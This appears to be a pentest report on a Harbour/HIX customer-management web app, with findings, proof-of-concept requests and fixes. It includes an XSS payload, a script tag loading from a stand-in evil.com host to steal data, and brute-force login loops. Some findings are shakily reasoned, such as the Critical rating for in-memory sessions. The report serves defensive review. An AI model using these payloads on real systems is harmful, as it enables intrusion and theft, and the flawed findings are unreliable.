# PENTEST REPORT — Harbour / HIX Web App (Fenix)

**Project**: Harbour-HIX Web App (Customer Management CRUD)  
**Version**: 1.0.0  
**Date**: 2026-09-30  
**Auditor**: Senior Penetration Tester / Secure Code Reviewer  
**Scope**: `webapp/` — full source review  
**Target**: Harbour RDD DBFCDX + HIX Framework v1.2 (HIXSTYLE)  
**Report ID**: PNT-Harbour-HIX.md.MOE.3.8  

---

## Executive Summary

| Severity | Count |
|----------|-------|
| **Critical** | 2 |
| **High** | 3 |
| **Medium** | 4 |
| **Low** | 2 |
| **Informational** | 3 |

**Overall Risk Rating: HIGH** — The application has a solid middleware-based auth framework (session, role, CSRF, rate-limit), but critical design decisions around **plaintext credential storage**, **session storage**, and **input validation on the update path** create exploitable attack vectors.

---

## Findings

---

### 1. Plaintext Credential Storage in Application Code

**Vulnerability Name & CWE ID**: Hardcoded Plaintext Credentials — CWE-798 (Use of Hard-coded Credentials) / CWE-259 (Use of Hard-coded Password)

**Severity Rating**: **Critical**

**Technical Explanation**:  
The `ModelUser()` function in `www/models/modeluser.prg` stores all user credentials in plaintext within a Harbour hash literal:

```harbour
hStore := {
   "demo"   => { "id" => "1", "name" => "Admin Demo", "pass" => "1234", ... },
   "carles" => { "id" => "2", "name" => "Carles Aubia", "pass" => "1234", ... },
   "maria"  => { "id" => "3", "name" => "Maria de la O", "pass" => "1234", ... }
}
```

All three users share the same password `"1234"`. The password comparison is a direct string equality check (`hEntry["pass"] == cPass`). An attacker who gains read access to the source file (via any file disclosure, source control leak, or backup) obtains valid credentials for all accounts.

**PoC (Proof of Concept) Attack Vector**:
```
# Attacker reads the source file (e.g., via directory traversal or backup access)
GET /path/to/modeluser.prg
# Result: credentials exposed in plaintext
# Login with any account:
POST /auth
Content-Type: application/x-www-form-urlencoded

_csrf=<valid_token>&username=demo&password=1234
# → 302 → /main (authenticated as admin)
```

**Remediation**:
- Hash all passwords using a strong algorithm (PBKDF2, bcrypt, or Argon2). Store salt + hash in the database or a secure key-value store.
- Never store credentials in application source code. Move to a database-backed user store with salted hashes.
- Immediately rotate all credentials (`"1234"` is trivially guessable).

---

### 2. In-Memory Session Storage (Session Data Lost on Restart)

**Vulnerability Name & CWE ID**: Loss of Session State — CWE-613 (Insufficient Session Expiration)

**Severity Rating**: **Critical**

**Technical Explanation**:  
`www/middlewares/config.json` specifies `"storage": "memory"`:

```json
"session": {
  "cookie":   "FENIXSID",
  "ttl":      3600,
  "max":      100,
  "storage":  "memory"
}
```

When the HIX server restarts (crash, deployment, or any restart), **all active sessions are destroyed**. While this might seem like a "security feature" (no session fixation on restart), it creates an operational vulnerability:

- An attacker who knows the session cookie `FENIXSID` can wait for a server restart and then attempt session fixation against the new server.
- No persistence means no session revocation capability — if a session is compromised, there is no way to invalidate it server-side (no session store to query).
- Combined with the 3600s TTL, an attacker who captures a cookie has a full hour window.

**PoC (Proof of Concept) Attack Vector**:
```
# Attacker captures FENIXSID cookie via XSS or network sniffing (HTTP)
# Waits for server restart (sessions lost)
# Attacker's session cookie is now invalid, but if the same SID is reused
# by a legitimate user, the attacker can hijack the session.
# More critically: no session revocation mechanism exists.
```

**Remediation**:
- Change `"storage"` to `"file"` and configure a secure storage path.
- Add a session revocation mechanism (e.g., `session:invalidate(id)`).
- Consider adding session fixation protection: regenerate session ID on login.

---

### 3. No Session Regeneration on Authentication (Session Fixation)

**Vulnerability Name & CWE ID**: Session Fixation — CWE-384

**Severity Rating**: **High**

**Technical Explanation**:  
In `controllers/auth.prg`, the authentication flow does **not** regenerate the session after successful login:

```harbour
// controllers/auth.prg
oSess := USession()
oSess:Set( UMwConfig( "auth", "session_user_key" ), hUser )
oSess:Save()
URedirect( UMwConfig( "auth", "redirect_accept" ) )
```

The session ID (`FENIXSID`) is created by `HIX_MwSession` middleware *before* authentication. If an attacker can set a known session cookie (via XSS, URL injection, or any means), the attacker's session ID becomes the authenticated session after login.

**PoC (Proof of Concept) Attack Vector**:
```
# 1. Attacker visits app, gets session cookie: FENIXSID=attacker_sid
# 2. Attacker sends victim link: https://app/login?redirect=main&session=attacker_sid
# 3. Victim logs in → session FENIXSID=attacker_sid now contains admin session
# 4. Attacker uses FENIXSID=attacker_sid → authenticated as victim
```

**Remediation**:
- After successful authentication, destroy the old session and create a new one:
```harbour
oSess:Destroy()
oSess := USession()
oSess:Set( UMwConfig( "auth", "session_user_key" ), hUser )
oSess:Save()
```
- Or use `HIX_MwSession`'s `regenerate()` method if available.

---

### 4. Weak Password Policy

**Vulnerability Name & CWE ID**: Weak Password Policy — CWE-521 (Weak Password Requirements)

**Severity Rating**: **High**

**Technical Explanation**:  
The validation in `controllers/auth.prg` requires only `min:4`:

```harbour
"password" => { "required|min:4", "Password", "" }
```

All three users share the password `"1234"` (4 characters). This is trivially guessable via brute force or dictionary attack. The rate-limit of 300/minute (see Finding 8) makes online brute force feasible.

**PoC (Proof of Concept) Attack Vector**:
```
# Attacker iterates through common 4-digit PINs:
for pin in ["1234","0000","1111","2222","1112","..."]:
    POST /auth { _csrf:tok, username:"demo", password:pin }
    # → 302 → /main if match found
```

**Remediation**:
- Increase minimum password length to 12+ characters.
- Require complexity (uppercase, lowercase, digit, special char).
- Implement password history to prevent reuse.
- Reduce rate-limit to 5-10 attempts per minute for login.

---

### 5. Missing Input Validation on Update Path (Potential for Data Injection)

**Vulnerability Name & CWE ID**: Insufficient Input Validation — CWE-20 (Improper Input Validation)

**Severity Rating**: **High**

**Technical Explanation**:  
In `controllers/masters/customer.prg`, the `Update()` method validates form fields but the validation rules are permissive:

```harbour
oVal := UValidatePost( {
   "first"    => "required|string|max:20|field",
   "last"     => "required|string|max:20|field",
   "street"   => "required|string|max:30|field",
   "city"     => "required|string|max:30|field",
   "state"    => "required|string|max:2|field",
   "zip"      => "required|string|max:10|field",
   "hiredate" => "required|date|field",
   "married"  => "logic|field",
   "age"      => "required|numeric|max:70|field",
   "notes"    => "string|field"
} )
```

The `notes` field has no length limit beyond what the DBF column allows. The `state` field accepts any 2-character string (not validated against the `states.dbf` table). The `married` field accepts any truthy value as `"logic"`. There is no validation that the `state` value exists in the states table.

The `Update()` method uses `UGetResource()` to get `_recno` and validates it, but the `_deleted` flag is set via `UPost('_deleted', .F.)` which allows the client to send `_deleted=true` in the form to undelete a record.

**PoC (Proof of Concept) Attack Vector**:
```
# Attacker sends a state code that doesn't exist in states.dbf:
POST /customer/1/update
_csrf=<valid_token>
first=John&last=Doe&street=123+Main&city=Nowhere&state=ZZ&zip=99999&age=30&notes=<script>alert(1)</script>

# The state ZZ is stored without validation against the states table.
# The notes field bypasses HTML maxlength and stores raw input.
```

**Remediation**:
- Validate `state` against the `states.dbf` table before storing.
- Add `notes` length validation (e.g., `max:500`).
- Sanitize `notes` output in templates (escape HTML entities).
- Ensure `_deleted` is not user-controllable.

---

### 6. No Content Security Policy (CSP)

**Vulnerability Name & CWE ID**: Missing Content Security Policy — CWE-693 (Protection Mechanism Failure)

**Severity Rating**: **Medium**

**Technical Explanation**:  
The `www/views/common/header.html` template loads Bootstrap and Bootstrap Icons from external CDNs:

```html
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.js"></script>
```

No `Content-Security-Policy` header is set. This allows:
- XSS via injected script tags (if any input escapes into templates).
- Data exfiltration via external script loading.
- No protection against clickjacking (no `X-Frame-Options`).

**PoC (Proof of Concept) Attack Vector**:
```
# If an XSS vector exists (e.g., notes field reflected in output):
# <script src="https://evil.com/steal.js"></script>
# → loads and executes arbitrary JavaScript
```

**Remediation**:
- Add CSP header: `Content-Security-Policy: default-src 'self'; script-src 'self' cdn.jsdelivr.net; style-src 'self' cdn.jsdelivr.net 'unsafe-inline';`
- Add `X-Frame-Options: DENY` header.
- Add `X-Content-Type-Options: nosniff` header.
- Consider self-hosting Bootstrap dependencies.

---

### 7. DBF File Accessibility (Data Exposure)

**Vulnerability Name & CWE ID**: Sensitive Data Exposure — CWE-200 (Information Exposure)

**Severity Rating**: **Medium**

**Technical Explanation**:  
The `data/` directory is at the application root:

```
webapp/data/
├── customers.cdx
├── customers.dbf
├── states.cdx
└── states.dbf
```

The `customers.dbf` file is 203,534 bytes. If the HIX server serves static files from the root directory or if the `.dbf` files are accessible via any URL pattern, the entire customer database is downloadable. The `app.rc` resource file and the `hix.json` config are also at the project root.

**PoC (Proof of Concept) Attack Vector**:
```
# If /data/ is served as static:
GET /data/customers.dbf
# → downloads entire customer database (name, address, age, hire date, marital status)

# If /hix.json is accessible:
GET /hix.json
# → reveals server config, session secrets, admin settings
```

**Remediation**:
- Move `data/` outside the web root (e.g., `/var/lib/hix/data/`).
- Set `allowed_hosts` in `hix.json`.
- Ensure the HIX server does not serve `.dbf`, `.cdx`, `.json`, `.prg`, `.hbp`, or `.rc` files.
- Remove `hix.json` from the served directory in production.

---

### 8. Excessive Rate-Limit for Login (300/minute)

**Vulnerability Name & CWE ID**: Insufficient Rate Limiting — CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Severity Rating**: **Medium**

**Technical Explanation**:  
`www/middlewares/config.json` sets:

```json
"ratelimit": {
  "ip_per_min": 300,
  "window_s":   60
}
```

300 login attempts per minute per IP is essentially unlimited for a brute-force attacker. The documentation itself notes: *"In production, lower it (5/60 or 10/60)."*

**PoC (Proof of Concept) Attack Vector**:
```
# Attacker sends 300 credential pairs per minute:
for i in range(300):
    POST /auth { _csrf:tok, username:"demo", password:pin[i] }
    # → if password is in the set, success
# Total attempts in 60s: 300
```

**Remediation**:
- Set `ip_per_min` to 5-10 for the login endpoint.
- Consider adding account lockout after N failed attempts.
- Use `HIX_MwRateLimitFactory()` for per-route rate limiting.

---

### 9. No HTTPS / SSL Configuration

**Vulnerability Name & CWE ID**: Cleartext Transmission of Sensitive Information — CWE-319

**Severity Rating**: **Medium**

**Technical Explanation**:  
`hix.json` shows:

```json
"ssl": false,
"cert_private": "",
"cert_public": ""
```

The session cookie `FENIXSID` is transmitted over the network. Without HTTPS, the session cookie can be intercepted via:
- Man-in-the-middle (MITM) attacks
- Network sniffing on shared networks
- Rogue Wi-Fi access points

The password is sent in plaintext form fields (not `type="password"` in the auth form — the login form is rendered via `UView("sys/login.html", ...)` which is not in the reviewed files).

**PoC (Proof of Concept) Attack Vector**:
```
# Attacker on same network captures:
# Cookie: FENIXSID=abc123...
# POST body: username=demo&password=1234
# → full credential theft
```

**Remediation**:
- Enable SSL: `"ssl": true` + provide certificate paths.
- Set `Secure` and `HttpOnly` flags on the `FENIXSID` cookie.
- Set `SameSite=Lax` (already set per docs, but verify).
- Use HSTS (`Strict-Transport-Security` header).

---

### 10. Missing Security Headers

**Vulnerability Name & CWE ID**: Information Disclosure via Missing Headers — CWE-693

**Severity Rating**: **Low**

**Technical Explanation**:  
No `X-Powered-By`, `X-Content-Type-Options`, `X-Frame-Options`, or `Referrer-Policy` headers are configured. The `hix.json` `"errorsys"` is empty, but the `trace` section is enabled for the app:

```json
"trace": {
  "app": true,
  "server": true,
  ...
}
```

This could leak internal paths, file structures, and error details to attackers.

**Remediation**:
- Set `"errorsys"` to a custom error handler.
- Disable `trace.app` and `trace.server` in production.
- Add security headers via middleware or server config.

---

### 11. Test Suite Exposed in Production

**Vulnerability Name & CWE ID**: Sensitive Information Exposure — CWE-200

**Severity Rating**: **Low**

**Technical Explanation**:  
`src/app.prg` explicitly allows the test directory:

```harbour
oServer:AllowDir( "test", .F. )
```

The test suite at `www/test/index.html` enumerates all routes, expected HTTP methods, and expected status codes. It also documents the authentication flow and role structure. In production, this gives an attacker a complete map of the application's security model.

**PoC (Proof of Concept) Attack Vector**:
```
GET /test/index.html
# Attacker reads:
# - All route URLs and methods
# - Expected auth behavior (302 for unauthenticated)
# - Role structure (customers:create, customers:edit, etc.)
# - CSRF mechanism details
```

**Remediation**:
- Remove `AllowDir("test")` in production builds.
- Move test files outside the served directory.
- Use a build-time flag to exclude test routes.

---

### 12. Session Cookie Name Predictable

**Vulnerability Name & CWE ID**: Predictable Session Identifier — CWE-330

**Severity Rating**: **Informational**

**Technical Explanation**:  
The session cookie is named `FENIXSID` (configurable but currently hardcoded). The cookie name is predictable and documented in the source. While the cookie *value* is generated by the framework, the name being well-known aids reconnaissance.

**Remediation**:
- Use a less predictable cookie name in production (e.g., random prefix).
- Or document that this is by design and acceptable.

---

### 13. No CSRF Protection on GET Routes (Informational)

**Vulnerability Name & CWE ID**: CSRF on GET — CWE-352

**Severity Rating**: **Informational**

**Technical Explanation**:  
The design intentionally omits CSRF on GET routes (`MyAppAuthRole` vs `MyAppAuthRoleEdit`). However, the `/customer/:id` show route does not validate the `Referer` or `Origin` header. If an attacker can craft a malicious page that triggers a GET request to `/customer/:id`, they could potentially enumerate customer records (though this is mitigated by the role check).

**Remediation**:
- Add `Origin`/`Referer` validation on sensitive GET endpoints.
- Document this as an accepted risk given the role-based access control.

---

## Architecture Assessment

### Strengths
| Area | Assessment |
|------|-----------|
| **Middleware Architecture** | ✅ Excellent — layered `MyApp*` groups provide clear separation of concerns. |
| **Role-Based Access Control** | ✅ Good — `HIX_MwHasRole` with `scope` strings provides granular authorization. |
| **CSRF Protection** | ✅ Good — stateless HMAC-based CSRF on all POST routes. |
| **Route Parameter Validation** | ✅ Good — `:id([0-9]+)` regex prevents non-numeric IDs at the router level. |
| **Rate Limiting** | ⚠️ Present but too permissive (300/min). |
| **Input Validation** | ⚠️ Present but incomplete (state code, notes length). |
| **Session Management** | ⚠️ In-memory only, no regeneration on login. |
| **Cryptography** | ❌ Plaintext credentials, no password hashing. |
| **Transport Security** | ❌ No SSL/TLS configured. |

### Threat Model Summary
```
Attacker → [Network Sniffing] → Session Cookie (FENIXSID)
Attacker → [Source Code Access] → Plaintext Passwords ("1234")
Attacker → [Brute Force] → 300 attempts/min → Account Compromise
Attacker → [Session Fixation] → Login → Hijacked Session
Attacker → [DBF File Access] → Full Customer Database Export
```

---

## Remediation Priority Matrix

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| **P0** | #1 Plaintext credentials | Low | Critical — immediate credential compromise |
| **P0** | #3 Session fixation | Low | High — session hijack |
| **P1** | #5 Input validation gaps | Medium | High — data integrity |
| **P1** | #4 Password policy | Low | High — brute force |
| **P1** | #8 Rate limit | Low | Medium — brute force |
| **P2** | #2 Session storage | Medium | Critical — availability |
| **P2** | #9 HTTPS | Medium | Medium — interception |
| **P2** | #7 DBF exposure | Low | Medium — data leak |
| **P3** | #6 CSP | Low | Medium |
| **P3** | #10 Headers | Low | Low |
| **P3** | #11 Test suite | Low | Low |

---

## Conclusion

The application demonstrates a mature middleware-based security architecture (session, role, CSRF, rate-limit) but is undermined by fundamental cryptographic and data security decisions: **plaintext passwords in source code** and **in-memory session storage** are the two critical findings that must be addressed immediately. The remaining findings represent standard web application hardening that should be addressed in the next release cycle.

---

*Report generated by automated source analysis and manual review. Findings are based on the provided source code at the time of audit. Runtime behavior may differ from static analysis.*
